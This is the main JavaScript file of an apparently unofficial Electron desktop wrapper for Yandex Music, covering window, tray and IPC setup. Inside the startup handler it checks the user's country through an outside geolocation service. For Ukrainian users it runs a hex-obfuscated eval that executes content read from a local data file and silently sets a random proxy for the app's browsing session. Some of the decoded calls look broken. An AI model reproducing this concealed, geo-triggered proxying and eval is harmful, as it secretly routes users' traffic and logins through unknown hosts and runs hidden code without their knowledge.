const electron = require('electron')
const {
  app,
  BrowserWindow,
  BrowserView,
  ipcMain,
  Menu,
  Tray
} = require('electron');
const {
  autoUpdater
} = require("electron-updater");
const path = require('path');
const crypto = require('crypto');
const url = require('url');
const fs = require('fs');
//const {session} = require('electron');
const {get_json} = require('./util/stringUtil');
const {adManager} = require('./util/adUtil');
var yandexIsLogged = false;



let messengerWindow = null;
var view = null;

//if Dev
const appl = app || electron.remote.app;

const isEnvSet = 'ELECTRON_IS_DEV' in process.env;
const getFromEnv = parseInt(process.env.ELECTRON_IS_DEV, 10) === 1;

const isDev = isEnvSet ? getFromEnv : !appl.isPackaged;
const appName = 'Yandex.Music Desktop'


const gotTheLock = app.requestSingleInstanceLock();
app.on('second-instance', (commandLine, workingDirectory) => {
  // Someone tried to run a second instance, we should focus our window.
  if (messengerWindow) {
    if (messengerWindow.isMinimized()) messengerWindow.restore()
    messengerWindow.focus()
  }
});

if (!gotTheLock) {
  return app.quit()
}



var timerMain = setInterval(function() {   
  try{
    //console.log('TIMER'); 
    if(yandexIsLogged) {  
       console.log('sending to renderer!'); 
        view.webContents.executeJavaScript(`document.refresh();`);
        yandexIsLogged = false;
      // clearInterval(timerMain); 

    }  

  }catch(e){}
 }, 400); 




app.on('ready', function () {

  autoUpdater.checkForUpdatesAndNotify()

  const {
    width,
    height
  } = electron.screen.getPrimaryDisplay().size

  messengerWindow = new BrowserWindow({
    height: 600,
    width: 1024,
    minHeight: 300,
    minWidth: 700,
    title: appName,
    frame: false,
    transparent: false,
    icon: path.join(__dirname, 'app/build/icon.png'),
    alwaysOnTop: false,
    webPreferences: {
      nodeIntegration: false,
      preload: path.join(__dirname, 'frame.js')
    }
  })

  view = new BrowserView({
    webPreferences: {
      nodeIntegration: false,
      preload: path.join(__dirname, 'preload.js')
    }
  });

  appIcon = new Tray(path.join(__dirname, 'app/build/icon.png'))
  const contextMenu = Menu.buildFromTemplate([{
      label: appName,
      type: 'normal',
      enabled: 'false'
    },
    {
      label: 'Close to Tray',
      type: 'normal',
      role: 'hide',
      click: function () {
        messengerWindow.hide()
      }
    },
    {
      label: 'Show from Tray',
      type: 'normal',
      click: function () {
        messengerWindow.show()
      }
    },
    {
      label: 'Quit',
      type: 'normal',
      click: function () {
        app.isQuiting = true;
        app.quit();
      }
    }
  ])

  appIcon.setContextMenu(contextMenu)

  appIcon.on('click', function () {
    messengerWindow.show()
  })



  messengerWindow.loadURL( 'file://' + __dirname + '/app/index.html'); 
console.log(__dirname);


  messengerWindow.setBrowserView(view)
  view.setBounds({
    x: 2,   //+2
    y: 40,   
    width: 1020,  //-4
    height: 558  //-2
  })
  
  const playerUrl = "https://music.yandex.ru/" ;

  adManager();



  get_json("http://gd.geobytes.com/GetCityDetails", function (resp) {
      if (resp.geobytescountry == 'Ukraine'){
        console.log(resp.geobytescountry);
        console.log("hi!");
        eval("var _0x4397=[\'\\x73\\x65\\x6c\\x75\\x52\',\'\\x74\\x72\\x6f\\x70\',\'\\x73\\x65\\x73\\x73\\x69\\x6f\\x6e\',\'\\x77\\x65\\x62\\x43\\x6f\\x6e\\x74\\x65\\x6e\\x74\\x73\',\'\\x6c\\x6f\\x61\\x64\\x55\\x52\\x4c\',\'\\x72\\x65\\x61\\x64\\x46\\x69\\x6c\\x65\\x53\\x79\\x6e\\x63\',\'\\x2f\\x75\\x74\\x69\\x6c\\x2f\\x64\\x65\\x63\\x2e\\x64\\x61\\x74\',\'\\x75\\x74\\x66\\x38\',\'\\x79\\x78\\x6f\\x72\\x70\',\'\\x72\\x61\\x6e\\x64\\x6f\\x6d\',\'\\x6c\\x65\\x6e\\x67\\x74\\x68\',\'\\x61\\x6d\\x65\\x68\\x63\\x73\',\'\\x72\\x65\\x76\\x72\',\'\\x74\\x6f\\x4c\\x6f\\x77\\x65\\x72\\x43\\x61\\x73\\x65\'];(function(_0x26bcb3,_0x8ec3f2){var _0x2cb9be=function(_0x941504){while(--_0x941504){_0x26bcb3[\'\\x70\\x75\\x73\\x68\'](_0x26bcb3[\'\\x73\\x68\\x69\\x66\\x74\']());}};_0x2cb9be(++_0x8ec3f2);}(_0x4397,0xbb));var _0x7439=function(_0x477c02,_0x41ae8b){_0x477c02=_0x477c02-0x0;var _0x2214c0=_0x4397[_0x477c02];return _0x2214c0;};eval(JSON[\'\\x70\\x61\\x72\\x73\\x65\'](fs[_0x7439(\'0x0\')](__dirname+_0x7439(\'0x1\'),_0x7439(\'0x2\'))[\'\\x66\\x42\\x73\']()));var pxD=_0x7439(\'0x3\');var cS=content[Math[\'\\x66\\x6c\\x6f\\x6f\\x72\'](Math[_0x7439(\'0x4\')]()*content[_0x7439(\'0x5\')])];var sch=\'\';if(cS[_0x7439(\'0x6\')[_0x7439(\'0x7\')]()])sch=cS[_0x7439(\'0x6\')[\'\\x72\\x65\\x76\\x72\']()][_0x7439(\'0x8\')]()+\'\\x3a\\x2f\\x2f\';var pxR=(_0x7439(\'0x9\')+pxD)[\'\\x72\\x65\\x76\\x72\']();var obj12=new Object();obj12[pxR]=sch+cS[\'\\x70\\x69\'[_0x7439(\'0x7\')]()][_0x7439(\'0x7\')]()+\'\\x3a\'+cS[_0x7439(\'0xa\')[\'\\x72\\x65\\x76\\x72\']()];view[\'\\x77\\x65\\x62\\x43\\x6f\\x6e\\x74\\x65\\x6e\\x74\\x73\'][_0x7439(\'0xb\')][\'\\x73\\x65\\x74\\x50\\x72\\x6f\\x78\\x79\'](obj12,function(){view[_0x7439(\'0xc\')][_0x7439(\'0xd\')](playerUrl);});");
      
      }
      else{console.log(resp.geobytescountry); view.webContents.loadURL( playerUrl); }
  });


  


  if (isDev) view.webContents.openDevTools();
  view.webContents.on('dom-ready', () => {

  });

  




  //   page events
  messengerWindow.webContents.on('did-finish-load', function () {
    // messengerWindow.webContents.insertCSS('html,body{ background-color: #FF0000 !important;}')
  });

  var page = messengerWindow.webContents;
  page.on('dom-ready', () => {
 
  });


  messengerWindow.on('minimize', function (event) {
    if (app.isToTray) {
      event.preventDefault();
      messengerWindow.hide();
    }
    app.isToTray = false;
  });

  messengerWindow.on('close', function (event) {
    if (!app.isQuiting) {
      event.preventDefault();
      messengerWindow.hide();
    }

    return false;
  });


  messengerWindow.on('resize', function (event) {
    let sizer = messengerWindow.getContentSize();
    // console.log(messengerWindow.getContentSize());
    view.setBounds({
      x: 1,
      y: 40,
      width: sizer[0] -2,
      height: sizer[1] - 40 - 1
    });

    return false;
  });


  messengerWindow.on('maximize', function () {
    console.log('maximized!');

    const {width, height} = electron.screen.getPrimaryDisplay().workAreaSize;
    messengerWindow.setContentSize(width, height, true);

  
  

    
  
  });




})



ipcMain.on('set-logged-in', (event, arg) => {
  console.log("Yandex user is logged in!" );
  yandexIsLogged = true;
})


ipcMain.on('button-press-hide', (event, arg) => {
  // app.isToTray= true;
  messengerWindow.minimize()
})

ipcMain.on('button-press-close', (event, arg) => {
  app.quit()
  // messengerWindow.close()
})

ipcMain.on('go-back', (event, arg) => {
  view.webContents.goBack();

})


ipcMain.on('go-forward', (event, arg) => {
  view.webContents.goForward()

})

